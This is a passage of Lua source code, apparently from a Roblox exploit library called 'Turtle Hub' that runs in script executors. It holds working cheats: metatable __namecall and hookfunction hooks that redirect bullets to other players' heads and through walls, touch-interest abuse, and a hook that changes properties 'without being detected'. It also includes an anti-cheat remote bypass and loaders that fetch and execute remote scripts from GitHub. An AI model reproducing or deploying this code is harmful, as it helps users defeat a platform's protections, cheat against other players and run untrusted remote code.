	end)
end

function lib:synapse(bool)
	lib:ErrorReader(function()
		rd3Exploit:ShowThird(bool)
	end)
end

function lib:FireTouch(gameservice,maindetect) -- sorted by vito, cuz fahri makes this code looks goofy
	if typeof(firetouchinterest) == "function" then
		if typeof(maindetect) ~= "nil" then
			if gameservice:FindFirstChild("TouchInterest") then
				firetouchinterest(maindetect,gameservice,0)
				task.wait(0.1)
				firetouchinterest(maindetect,gameservice,1)
			end
		elseif typeof(maindetect) == "nil" then
			lib:descendant(gameservice,function(v)
				if v:IsA("TouchTransmitter") then
					firetouchinterest(LocalPlayer.Character.HumanoidRootPart,v.Parent,0)
					task.wait(0.1)
					firetouchinterest(LocalPlayer.Character.HumanoidRootPart,v.Parent,1)
				end
			end)
		end
	else
		lib:notify(lib:ColorFonts("Your exploit doesnt support firetouchinterest function.","Bold,Red"),20)
		return 
	end -- firetouchinterest function detect
end

function lib:RemoteSpy(arg)
	local verrspy = arg or "V1"
	if getgenv and typeof(BindableRemotes) ~= "nil" then -- this table is for turtle client remotes
		TurtleScreenNotify("Turtle Client",`Missing environment table\nPlease contact a scripter for fixing it\n\ngetgenv : {(getgenv and "added" or "missing")}\nEnvironment table : {(BindableRemotes and "added" or "missing")}`,{},nil,{})
		return
	end
	local isrun,iserror = pcall(function()
		if getgenv() and typeof(AdonisRemoteBypass) ~= "nil" then
			if AdonisRemoteBypass == true then
				lib:RemoteBypass()
			end
		end
		if verrspy == "V1" then
			lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/modified-remote-spy/main/V1.lua")
		elseif verrspy == "V2" then
			lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/modified-remote-spy/main/V2.lua")
		elseif verrspy == "V3" then
			lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/modified-remote-spy/main/V3.lua")
		elseif verrspy == "V4" then
			lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/modified-remote-spy/refs/heads/main/V4.lua")
		elseif verrspy == "Old" then
			lib:LoadRepository("https://raw.githubusercontent.com/Sidhsksjsjsh/Jshdjdhdkdb/main/Omgshit.lua")
		end
	end)
	if not isrun then
		lib:WarnUser(lib:ColorFonts(iserror,"Bold,Red"))
		lib:hooksend("RemoteSpy error: \n```\n" .. iserror .. "\n```")
	end
end

function lib:Serverhop(val)
    local x = {}
    local vartbl = val or "normal"
    if vartbl == "normal" then
	for _, v in ipairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
    else
	for _, v in ipairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.playing < val and v.id ~= game.JobId then --v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
    end
    if #x > 0 then
	TurtleScreenNotify("Turtle Hub | Game Teleport","Teleporting u to a new server\nthis takes 2s or more due to the roblox GameTeleport limitations",{},nil,{})
	wait(2)
        TeleportService:TeleportToPlaceInstance(game.PlaceId,x[math.random(1,#x)])
    else
        lib:notify(lib:ColorFonts("Cannot find a server","Red"),10)
    end
end
 
function lib:CheckServers(n,funct)
    local x = {}
    local tgh = false
    local chck = n or "normal"
    if chck == "normal" then
	for _, v in ipairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
    else
	for _, v in ipairs(HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
		if type(v) == "table" and v.playing < chck and v.id ~= game.JobId then
			x[#x + 1] = v.id
		end
	end
    end
    if #x > 0 then
        tgh = true
    else
        tgh = false
    end
	if tgh == true then
		TurtleScreenNotify("Turtle Hub | Server Hop • Server found","Server found!\n\nAre u sure want to server hop?",{"Yea Sure"},nil,{
				["Yea Sure"] = function()
					funct(true)
				end
		})
	else
		TurtleScreenNotify("Turtle Hub | Server Hop • Server not found","Oops, we couldnt find a server for u\n\nClick again to server hop",{},nil,{})
		funct(false)
	end
end

--[[
lib:CheckServers(3,function(vuln)
if vuln == true then
lib:Serverhop(3)
end
end)
lib:rejoin()
]]

function lib:rejoin()
    if #game.Players:GetPlayers() <= 1 then
        TeleportService:Teleport(game.PlaceId,LocalPlayer)
    else
        TeleportService:TeleportToPlaceInstance(game.PlaceId,game.JobId,LocalPlayer)
    end
end

function lib:FormatRGB(str)
	if str == "rgb" then
		return Color3.fromRGB(math.floor(((math.sin(workspace.DistributedGameTime/2)/2)+0.5)*255),math.floor(((math.sin(workspace.DistributedGameTime)/2)+0.5)*255),math.floor(((math.sin(workspace.DistributedGameTime*1.5)/2)+0.5)*255))
	elseif str == "gradient" then
		return {
			ColorSequence.new{
				ColorSequenceKeypoint.new(0,Color3.fromRGB(0,0,128)),
				ColorSequenceKeypoint.new(1,Color3.fromRGB(75,0,130))
			},
			ColorSequence.new{
				ColorSequenceKeypoint.new(0,Color3.fromRGB(25,25,112)),
				ColorSequenceKeypoint.new(1,Color3.fromRGB(138,43,226))
			},
			ColorSequence.new{
				ColorSequenceKeypoint.new(0,Color3.fromRGB(72,61,139)),
				ColorSequenceKeypoint.new(1,Color3.fromRGB(147,112,219))
			},
			ColorSequence.new{
				ColorSequenceKeypoint.new(0,Color3.fromRGB(0,0,0)),
				ColorSequenceKeypoint.new(1,Color3.fromRGB(153,50,204))
			}
		}
	end
end
--[[
local colors = {
    ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 128)), ColorSequenceKeypoint.new(1, Color3.fromRGB(75, 0, 130))},
    ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 112)), ColorSequenceKeypoint.new(1, Color3.fromRGB(138, 43, 226))},
    ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(72, 61, 139)), ColorSequenceKeypoint.new(1, Color3.fromRGB(147, 112, 219))},
    ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(153, 50, 204))}
}

-- Function to tween the gradient colors
local function tweenGradient()
    local index = 1
    while true do
        local nextIndex = (index % #colors) + 1
        local tween = TweenService:Create(uiGradient,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{Color = colors[index]})
        TweenService:Create(uiGradient,TweenInfo.new(1,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut),{Color = lib:FormatRGB("gradient")[index]}):Play()
        tween.Completed:Wait()
        index = (index % #colors) + 1
        wait(1)
    end
end
]]
function lib.getClipboard()
	local executeclipboard = readclipboard_hideenv or getclipboard
	if executeclipboard then
		return executeclipboard()
	end
end

function lib.FPSConfigs(str,value)
	if type(str) == "string" then
		if str == "set" then
			setfpscap(value)
		elseif str == "max" then
			setfpsmax(value)
		elseif str == "get" then
			return getfpscap()
		end
	else
		lib:notify(lib:ColorFonts("Argument 1 : " .. type(str) .. "/" .. typeof(str) .. ", Argument 2 : " .. type(value) .. "/" .. typeof(value),"Red"),30)
	end
end

function lib.RaycastManipulation(mode) -- this function will let u modified/manipulation in-game weapon bullet direction
	TurtleFlags.TrackType = "HumanoidRootPart"
	if mode == "newcclosure" then
		local meta = getrawmetatable(game)
		setreadonly(meta,false)
		TurtleFlags.FindPartOnRayIgnoreList = {}
		TurtleFlags.FindPartOnRayWhitelist = {}
		local raycastParams = RaycastParams.new()
                --raycastParams.FilterType = (typeof(TurtleFlags.FilterType) ~= "nil" and TurtleFlags.FilterType or Enum.RaycastFilterType.Whitelist)  -- bullet obstacle, use turtle global table to make it working
                --raycastParams.FilterDescendantsInstances = (typeof(TurtleFlags.FilterInstance) ~= "nil" and TurtleFlags.FilterInstance or {LocalPlayer.Character})
		
		local oldNamecall = meta.__namecall
		meta.__namecall = newcclosure(function(self,...)
			local args = {...}
			local method = getnamecallmethod()
			raycastParams.FilterType = (typeof(TurtleFlags.FilterType) ~= "nil" and TurtleFlags.FilterType or Enum.RaycastFilterType.Whitelist)  -- bullet obstacle, use turtle global table to make it working
                	raycastParams.FilterDescendantsInstances = (typeof(TurtleFlags.FilterInstance) ~= "nil" and TurtleFlags.FilterInstance or {LocalPlayer.Character})

			if method == "Raycast" and TurtleFlags.EnableRayMod == true then
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					local pos,OnScreen = Camera:WorldToViewportPoint(v.Character.Head.Position)
					if OnScreen == true then -- this mean will check the target if it is in screen
						if TurtleFlags.FOVDetection == true then
							if (Vector2.new(Camera.ViewportSize.X / 2,Camera.ViewportSize.Y / 2) - Vector2.new(pos.X,pos.Y)).Magnitude < TurtleFlags.ScreenRadiusPercentage then -- will check if the target is inside the circle/screen radius
								args[2] = (v.Character.Head.Position + Vector3.new(0,(LocalPlayer.Character.HumanoidRootPart.Position - v.Character.Head.Position).Magnitude / 500,0) - LocalPlayer.Character.HumanoidRootPart.Position).Unit * 9e9 -- bullet direction ⚠️DONT CHANGE IT IF U DOESNT UNDERSTAND LUA!⚠️
								args[3] = raycastParams -- bullet obstacle, this will make ur gun shoot through the wall [ we call it wallbang ]
								return self.Raycast(self,unpack(args)) --oldNamecall(self,unpack(args))
							end
						else -- will redirect the bullets if u wanna track all players
							if #(Camera:GetPartsObscuringTarget({v.Character.Head.Position},v.Character:GetChildren())) == 0 then -- only find a non-hidding player
								args[2] = (v.Character.Head.Position + Vector3.new(0,(LocalPlayer.Character.HumanoidRootPart.Position - v.Character.Head.Position).Magnitude / 500,0) - LocalPlayer.Character.HumanoidRootPart.Position).Unit * 9e9 -- bullet direction ⚠️DONT CHANGE IT IF U DOESNT UNDERSTAND LUA!⚠️
								args[3] = raycastParams -- bullet obstacle, this will make ur gun shoot through the wall [ we call it wallbang ]
								return self.Raycast(self,unpack(args))
							end
						end --
					end --
				end
			end
			return oldNamecall(self,...)
		end)
	elseif mode == "hookfunction" then
		local oldRay = hookfunction(Ray.new,function(...)
			if getcallingscript().Name == "Popper" or getcallingscript().Name == "ZoomController" or getcallingscript().Name == "Poppercam" or getcallingscript().Name == "CameraModule" then
				return oldRay(...)
			end -- this will block Infinite Loop caused by CameraModule... now, this wont spam any error (i think)
				
			if TurtleFlags.EnableRayMod == true then
				local args = {...}
				for i,v in pairs(game:GetService("Players"):GetPlayers()) do
					if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("Head") then
						local pos,OnScreen = Camera:WorldToViewportPoint(v.Character.Head.Position)
						if OnScreen == true then -- this mean will check the target if it is in screen
							if TurtleFlags.FOVDetection == true then
								if (Vector2.new(Camera.ViewportSize.X / 2,Camera.ViewportSize.Y / 2) - Vector2.new(pos.X,pos.Y)).Magnitude < TurtleFlags.ScreenRadiusPercentage then -- will check if the target is inside the circle/screen radius
									args[1] = LocalPlayer.Character.HumanoidRootPart.Position
									args[2] = (v.Character.Head.Position + Vector3.new(0,(LocalPlayer.Character.HumanoidRootPart.Position - v.Character.Head.Position).Magnitude / 500,0) - LocalPlayer.Character.HumanoidRootPart.Position).Unit * 9e9
								end
							end
						end
					end
				end
				return oldRay(unpack(args))
			end
			return oldRay(...)
		end)
	else
		TurtleScreenNotify("Turtle Hub | null mode","the mode u entered are invalid or missing or no listed",{},nil,{})
	end
end

function lib:ChangePropertyWithoutBeingDetected(instname,prop,changedvalue)
	local mt = getrawmetatable(game)
	setreadonly(mt,false)
	local oldNewIndex = mt.__newindex
	mt.__newindex = newcclosure(function(path,key,value)
		if typeof(instname) == "string" then
			if path.Name == instname and key == prop then
				rawset(path,key,(typeof(changedvalue) ~= "nil" and changedvalue or value)) -- Mengubah nilai tanpa terdeteksi
				return
			end
		elseif typeof(instname) == "Instance" then
			if path == instname and key == prop then
				rawset(path,key,(typeof(changedvalue) ~= "nil" and changedvalue or value)) -- Mengubah nilai tanpa terdeteksi
				return
			end
		end
		return oldNewIndex(path,key,value)
	end)
end

function lib:GameManipulation(func)
	local mt = getrawmetatable(game)
	setreadonly(mt,false)
	local oldNamecall = mt.__namecall
	local oldIndex = mt.__index
	
	mt.__index = newcclosure(function(path,key)
		func(path,path.Name,key)
		return oldIndex(path,key)
	end)
end

--[[
task.defer(function()
Meta_Env:GameManipulation(function(a,b,c)
if a == "Humanoid" and b == "WalkSpeed" then
return 16
end
end)
end)
```
• Message : C stack overflow
    Stack Begin
    Script 'CameraModule.ZoomController.Popper', Line 260 - function queryPoint
    Script 'CameraModule.ZoomController.Popper', Line 332 - function queryViewport
    Script 'CameraModule.ZoomController.Popper', Line 402 - function Popper
    Script 'CameraModule.ZoomController', Line 109 - function Update
    Script 'CameraModule.Poppercam', Line 112 - function Update
    Script 'CameraModule', Line 512 - function Update
    Script 'CameraModule', Line 144
    Stack End
• Output type : Enum.MessageType.MessageError
```

local function getRayPosition(direct)
  return Ray.new(myself.Character.HumanoidRootPart.Position,(direct + Vector3.new(0,(myself.Character.HumanoidRootPart.Position - direct).Magnitude / 500,0) - myself.Character.HumanoidRootPart.Position).Unit * 9e9)
end


-- FPS and Ping Display (Optional, if you want to keep it)

local FpsPingFrame = Instance.new("Frame")
FpsPingFrame.Name = "FpsPingFrame"
FpsPingFrame.Parent = GO_FUCK_URSELF
FpsPingFrame.BackgroundColor3 = Color3.fromRGB(29,29,29)
FpsPingFrame.BackgroundTransparency = 0.2
FpsPingFrame.BorderSizePixel = 0
FpsPingFrame.Position = UDim2.new(0.01,0,0.01,0)
FpsPingFrame.Size = UDim2.new(0,150,0,50) --UDim2.new(0,150,0,50)
FpsPingFrame.Visible = false
drag(FpsPingFrame)

local UICorner_FpsPing = Instance.new("UICorner")
UICorner_FpsPing.CornerRadius = UDim.new(0,8)
UICorner_FpsPing.Parent = FpsPingFrame

local Blur_FpsPing = Instance.new("ImageLabel")
Blur_FpsPing.Name = "Blur_FpsPing"
Blur_FpsPing.Parent = lib.Interface("hide")
Blur_FpsPing.BackgroundTransparency = 1
Blur_FpsPing.BorderSizePixel = 0
Blur_FpsPing.Size = UDim2.new(1,0,1,0)
Blur_FpsPing.Image = "http://www.roblox.com/asset/?id=6758962034"
Blur_FpsPing.ImageTransparency = 0.55

local function GetTimePlayed()
	local seconds = math.floor(workspace.DistributedGameTime)
	local minutes = math.floor(workspace.DistributedGameTime / 60)
	local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
	local seconds = seconds - (minutes * 60)
	local minutes = minutes - (hours * 60)
	if hours < 1 then 
		if minutes < 1 then
			return seconds .. ' Second(s)'
		else
			return minutes .. " Minute(s), " .. seconds .. ' Second(s)'
		end
	else
		return hours .. ' Hour(s), ' .. minutes .. ' Minute(s), ' .. seconds .. ' Second(s)'
	end
end]]

local function GetTimePlayed()
	local seconds = math.floor(workspace.DistributedGameTime)
	local minutes = math.floor(workspace.DistributedGameTime / 60)
	local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
	local seconds = seconds - (minutes * 60)
	local minutes = minutes - (hours * 60)
	return (typeof(hours) ~= "nil" and hours or 0) .. ':' .. (typeof(minutes) ~= "nil" and minutes or 0) .. ':' .. (typeof(seconds) ~= "nil" and seconds or 0) .. ''
end

--lib:FormatRGB("gradient") local method = getnamecallmethod()
function lib:Window(text,preset,closebind)
    CloseBind = closebind or Enum.KeyCode.RightControl
    PresetColor = preset or Color3.fromRGB(0, 255, 0)
    fs = false
    TurtleFlags.DescTextStyle = "Bold,Gray"

	local FpsPingFrame = Instance.new("Frame")
	FpsPingFrame.Name = "FpsPingFrame"
	FpsPingFrame.Parent = GO_FUCK_URSELF
	FpsPingFrame.BackgroundColor3 = Color3.fromRGB(29,29,29)
	FpsPingFrame.BackgroundTransparency = 0.2
	FpsPingFrame.BorderSizePixel = 0
	FpsPingFrame.Position = UDim2.new(0.01,0,0.01,0)
	FpsPingFrame.Size = UDim2.new(0,150,0,50) --UDim2.new(0,150,0,50)
	FpsPingFrame.Visible = false
	FpsPingFrame.Transparency = 1
	drag(FpsPingFrame)
	TurtleFlags.CounterFrame = FpsPingFrame

	local UICorner_FpsPing = Instance.new("UICorner")
	UICorner_FpsPing.CornerRadius = UDim.new(0,8)
	UICorner_FpsPing.Parent = FpsPingFrame

	local Blur_FpsPing = Instance.new("ImageLabel")
	Blur_FpsPing.Name = "Blur_FpsPing"
	Blur_FpsPing.Parent = nil
	Blur_FpsPing.BackgroundTransparency = 1
	Blur_FpsPing.BorderSizePixel = 0
	Blur_FpsPing.Size = UDim2.new(1,0,1,0)
	Blur_FpsPing.Image = "http://www.roblox.com/asset/?id=6758962034"
	Blur_FpsPing.ImageTransparency = 0.55
	
    local Main = Instance.new("Frame")
    local TabHold = Instance.new("ScrollingFrame")
    local TabHoldLayout = Instance.new("UIListLayout")
    local Title = Instance.new("TextLabel")
    local TabFolder = Instance.new("Folder")
    local DragFrame = Instance.new("Frame")
    local UICorner_hide = Instance.new("UICorner")
	
    Main.Name = "Main"
    Main.Parent = ui
    Main.AnchorPoint = Vector2.new(0.5,0.5)
    Main.BackgroundColor3 = Color3.fromRGB(30,30,30)
    Main.BorderSizePixel = 0
    Main.Position = UDim2.new(0.5, 0, 0.5, 0)
    Main.Size = UDim2.new(0, 0, 0, 0)
    Main.ClipsDescendants = true
    Main.Visible = true

    TabHold.Name = "TabHold"
    TabHold.Parent = Main
    TabHold.Active = true
    TabHold.BackgroundColor3 = Color3.fromRGB(255,255,255)
    TabHold.BackgroundTransparency = 1.000
    TabHold.BorderSizePixel = 0
    TabHold.Position = UDim2.new(0.0339285731,0,0.147335425,0)
    TabHold.Size = UDim2.new(0,107,0,254)
    TabHold.CanvasSize = UDim2.new(0,0,0,0)
    TabHold.ScrollBarThickness = 3
    TabHoldLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
		TabHold.CanvasSize = UDim2.new(0,0,0,TabHoldLayout.AbsoluteContentSize.Y + 16)
    end)
	
    TabHoldLayout.Name = "TabHoldLayout"
    TabHoldLayout.Parent = TabHold
    TabHoldLayout.SortOrder = Enum.SortOrder.LayoutOrder
    TabHoldLayout.Padding = UDim.new(0, 11)

    Title.Name = "Title"
    Title.Parent = Main
    Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Title.BackgroundTransparency = 1.000
    Title.Position = UDim2.new(0.0339285731, 0, 0.0564263314, 0)
    Title.Size = UDim2.new(0, 200, 0, 23)
    Title.Font = Enum.Font.GothamSemibold
    Title.Text = text:gsub("VIP Turtle Hub V4",lib:ColorFonts("VIP Turtle Hub V4","White")):gsub(text:sub(18,#text),"")
    Title.TextColor3 = Color3.fromRGB(68,68,68)
    Title.TextSize = 12.000
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.RichText = true

    local FpsLabel = Instance.new("TextLabel")
    FpsLabel.Name = "FPS"
    FpsLabel.Parent = FpsPingFrame
    FpsLabel.BackgroundTransparency = 1
    FpsLabel.BorderSizePixel = 0
    FpsLabel.Position = UDim2.new(0.1,0,0.1,0)
    FpsLabel.Size = UDim2.new(0.8,0,0.3,0)
    FpsLabel.Font = Enum.Font.JosefinSans
    FpsLabel.Text = "FPS : %"
    FpsLabel.TextColor3 = Color3.fromRGB(93,255,255)
    FpsLabel.TextSize = 14
    FpsLabel.TextXAlignment = Enum.TextXAlignment.Left
    FpsLabel.RichText = true
    FpsLabel.TextStrokeTransparency = 0
	local FPS_BLUR = Blur_FpsPing:Clone()
	FPS_BLUR.Parent = FpsLabel
	--FPS_BLUR.Position = FpsLabel.Position
	
    local PingLabel = Instance.new("TextLabel")
    PingLabel.Name = "PING"
    PingLabel.Parent = FpsPingFrame
    PingLabel.BackgroundTransparency = 1
    PingLabel.BorderSizePixel = 0
    PingLabel.Position = UDim2.new(0.1,0,0.5,0)
    PingLabel.Size = UDim2.new(0.8,0,0.3,0)
    PingLabel.Font = Enum.Font.JosefinSans
    PingLabel.Text = "Ping : %ms"
    PingLabel.TextColor3 = Color3.fromRGB(93,255,255)
    PingLabel.TextSize = 14
    PingLabel.TextXAlignment = Enum.TextXAlignment.Left
    PingLabel.RichText = true
    PingLabel.TextStrokeTransparency = 0
	local PING_BLUR = Blur_FpsPing:Clone()
	PING_BLUR.Parent = PingLabel
	--PING_BLUR.Position = PingLabel.Position
	
    local MemoryLabel = Instance.new("TextLabel")
    MemoryLabel.Name = "MEMORY"
    MemoryLabel.Parent = FpsPingFrame
    MemoryLabel.BackgroundTransparency = 1
    MemoryLabel.BorderSizePixel = 0
    MemoryLabel.Position = UDim2.new(0.1,0,PingLabel.Position.Y.Scale + 0.4,0)
    MemoryLabel.Size = UDim2.new(0.8,0,0.3,0)
    MemoryLabel.Font = Enum.Font.JosefinSans
    MemoryLabel.Text = "Memory Usage : %MB"
    MemoryLabel.TextColor3 = Color3.fromRGB(93,255,255)
    MemoryLabel.TextSize = 14
    MemoryLabel.TextXAlignment = Enum.TextXAlignment.Left
    MemoryLabel.RichText = true
    MemoryLabel.TextStrokeTransparency = 0
	local MEMORY_BLUR = Blur_FpsPing:Clone()
	MEMORY_BLUR.Parent = MemoryLabel
	--MEMORY_BLUR.Position = MemoryLabel.Position
	
    local PlayersLabel = Instance.new("TextLabel")
    PlayersLabel.Name = "Player"
    PlayersLabel.Parent = FpsPingFrame
    PlayersLabel.BackgroundTransparency = 1
    PlayersLabel.BorderSizePixel = 0
    PlayersLabel.Position = UDim2.new(0.1,0,MemoryLabel.Position.Y.Scale + 0.4,0)
    PlayersLabel.Size = UDim2.new(0.8,0,0.3,0)
    PlayersLabel.Font = Enum.Font.JosefinSans
    PlayersLabel.Text = "Players : %"
    PlayersLabel.TextColor3 = Color3.fromRGB(93,255,255)
    PlayersLabel.TextSize = 14
    PlayersLabel.TextXAlignment = Enum.TextXAlignment.Left
    PlayersLabel.RichText = true
    PlayersLabel.TextStrokeTransparency = 0
	local PLAYERS_BLUR = Blur_FpsPing:Clone()
	PLAYERS_BLUR.Parent = PlayersLabel
	--PLAYERS_BLUR.Position = PlayersLabel.Position
	
    local TimesLabel = Instance.new("TextLabel")
    TimesLabel.Name = "Player"
    TimesLabel.Parent = FpsPingFrame
    TimesLabel.BackgroundTransparency = 1
    TimesLabel.BorderSizePixel = 0
    TimesLabel.Position = UDim2.new(0.1,0,PlayersLabel.Position.Y.Scale + 0.4,0)
    TimesLabel.Size = UDim2.new(0.8,0,0.3,0)
    TimesLabel.Font = Enum.Font.JosefinSans
    TimesLabel.Text = "Time : %"
    TimesLabel.TextColor3 = Color3.fromRGB(93,255,255)
    TimesLabel.TextSize = 14
    TimesLabel.TextXAlignment = Enum.TextXAlignment.Left
    TimesLabel.RichText = true
    TimesLabel.TextStrokeTransparency = 0
	local TIMES_BLUR = Blur_FpsPing:Clone()
	TIMES_BLUR.Parent = TimesLabel
	--TIMES_BLUR.Position = TimesLabel.Position
	
    local TIMEPLAYEDLabel = Instance.new("TextLabel")
    TIMEPLAYEDLabel.Name = "Time Played"
    TIMEPLAYEDLabel.Parent = FpsPingFrame
    TIMEPLAYEDLabel.BackgroundTransparency = 1
    TIMEPLAYEDLabel.BorderSizePixel = 0
    TIMEPLAYEDLabel.Position = UDim2.new(0.1,0,TimesLabel.Position.Y.Scale + 0.4,0)
    TIMEPLAYEDLabel.Size = UDim2.new(0.8,0,0.3,0)
    TIMEPLAYEDLabel.Font = Enum.Font.JosefinSans
    TIMEPLAYEDLabel.Text = "Time Played : %"
    TIMEPLAYEDLabel.TextColor3 = Color3.fromRGB(93,255,255)
    TIMEPLAYEDLabel.TextSize = 14
    TIMEPLAYEDLabel.TextXAlignment = Enum.TextXAlignment.Left
    TIMEPLAYEDLabel.RichText = true
    TIMEPLAYEDLabel.TextStrokeTransparency = 0
	local TIME_PLAYED_BLUR = Blur_FpsPing:Clone()
	TIME_PLAYED_BLUR.Parent = TIMEPLAYEDLabel
	--TIME_PLAYED_BLUR.Position = TIMEPLAYEDLabel.Position
	
    local ExploitIdentify = Instance.new("TextLabel")
    ExploitIdentify.Name = "ExploitIdentify"
    ExploitIdentify.Parent = FpsPingFrame
    ExploitIdentify.BackgroundTransparency = 1
    ExploitIdentify.BorderSizePixel = 0
    ExploitIdentify.Position = UDim2.new(0.1,0,TIMEPLAYEDLabel.Position.Y.Scale + 0.4,0)
    ExploitIdentify.Size = UDim2.new(0.8,0,0.3,0)
    ExploitIdentify.Font = Enum.Font.JosefinSans
    ExploitIdentify.Text = "User-Agent : " .. (typeof(identifyexecutor) == "function" and identifyexecutor() or "null")
    ExploitIdentify.TextColor3 = Color3.fromRGB(93,255,255)
    ExploitIdentify.TextSize = 14
    ExploitIdentify.TextXAlignment = Enum.TextXAlignment.Left
    ExploitIdentify.RichText = true
    ExploitIdentify.TextStrokeTransparency = 0
	local IDENTIFY_EXPLOIT_BLUR = Blur_FpsPing:Clone()
	IDENTIFY_EXPLOIT_BLUR.Parent = ExploitIdentify
	--TIME_PLAYED_BLUR.Position = TIMEPLAYEDLabel.Position
	
	local HighestFPS = 60
	local LowestFPS = 60 -- set 60 for easy set
	
	local HighestPing = 100
	local LowestPing = 100 -- dont change
	
	local HighestMemory = 100 -- dont change
	local LowestMemory = 100 -- this also
	
	local HighestPlayers = 0
	local LowestPlayers = 100
    if typeof(emoji) == "string" then -- GetTimePlayed()
	Title.Text = ("%s | %s"):format(lib:ColorFonts(Title.Text,"Bold,White"),emoji) -- VIP Turtle Hub V4 (17)
	lib:notify(lib:ColorFonts("Current event : " .. emoji,"Bold,Green"),10)
	lib:Loop(function()
		PingLabel.Text = `Ping : {(getPing() >= 1000 and lib:ColorFonts(getPing() .. "ms","Red") or getPing() >= 500 and lib:ColorFonts(getPing() .. "ms","Yellow") or lib:ColorFonts(getPing() .. "ms","Sky Blue"))} (↑ {HighestPing}ms • ↓ {LowestPing}ms) ({math.floor((LocalPlayer:GetNetworkPing() or 0))} ms)`
		MemoryLabel.Text = `Memory Usage : {(lib:MemoryFormat(Stats.GetTotalMemoryUsageMb(Stats)) or "0 KB")} (↑ {lib:MemoryFormat(HighestMemory)} • ↓ {lib:MemoryFormat(LowestMemory)})`
		PlayersLabel.Text = `Players : {#game:GetService("Players"):GetPlayers()} (↑ {HighestPlayers} • ↓ {LowestPlayers})`
		TimesLabel.Text = `Time : {DateTime.now():FormatLocalTime("h:mm:ss A","en-us")}`
		TIMEPLAYEDLabel.Text = `Time Played : {GetTimePlayed()}`
		if getPing() > HighestPing then
			HighestPing = getPing()
		elseif getPing() < LowestPing then
			LowestPing = getPing()
		end
		if Stats.GetTotalMemoryUsageMb(Stats) > HighestMemory then
			HighestMemory = Stats.GetTotalMemoryUsageMb(Stats)
		elseif Stats.GetTotalMemoryUsageMb(Stats) < LowestMemory then
			LowestMemory = Stats.GetTotalMemoryUsageMb(Stats)
		end
		if #game:GetService("Players"):GetPlayers() > HighestPlayers then
			HighestPlayers = #game:GetService("Players"):GetPlayers()
		elseif #game:GetService("Players"):GetPlayers() < LowestPlayers then
			LowestPlayers = #game:GetService("Players"):GetPlayers()
		end
				
		FPS_BLUR.Size = UDim2.new(0,FpsLabel.TextBounds.X + 10,0,FpsLabel.TextBounds.Y + 6)
		PING_BLUR.Size = UDim2.new(0,PingLabel.TextBounds.X + 10,0,PingLabel.TextBounds.Y + 6)
		MEMORY_BLUR.Size = UDim2.new(0,MemoryLabel.TextBounds.X + 10,0,MemoryLabel.TextBounds.Y + 6)
		PLAYERS_BLUR.Size = UDim2.new(0,PlayersLabel.TextBounds.X + 10,0,PlayersLabel.TextBounds.Y + 6)
		TIMES_BLUR.Size = UDim2.new(0,TimesLabel.TextBounds.X + 10,0,TimesLabel.TextBounds.Y + 6)
		TIME_PLAYED_BLUR.Size = UDim2.new(0,TIMEPLAYEDLabel.TextBounds.X + 10,0,TIMEPLAYEDLabel.TextBounds.Y + 6)
	end)
	lib:runtime(function(v)
		FpsLabel.Text = `FPS : {(math.round(1/v) <= 30 and lib:ColorFonts(math.round(1/v),"Yellow") or math.round(1/v) <= 10 and lib:ColorFonts(math.round(1/v),"Red") or lib:ColorFonts(math.round(1/v),"White"))} (↑ {HighestFPS} • ↓ {LowestFPS}) ({(math.floor(workspace:GetRealPhysicsFPS()) <= 30 and lib:ColorFonts(math.floor(workspace:GetRealPhysicsFPS()),"Yellow") or math.floor(workspace:GetRealPhysicsFPS()) <= 10 and lib:ColorFonts(math.floor(workspace:GetRealPhysicsFPS()),"Red") or lib:ColorFonts(math.floor(workspace:GetRealPhysicsFPS()),"Sky Blue"))}/R)`
		if math.round(1/v) > HighestFPS then
			HighestFPS = math.round(1/v)
		elseif math.round(1/v) < LowestFPS then
			LowestFPS = math.round(1/v)
		end
		task.wait(1)
	end)
    else --DateTime.now():FormatLocalTime("h:mm:ss A","en-us")
	lib:Loop(function(v)
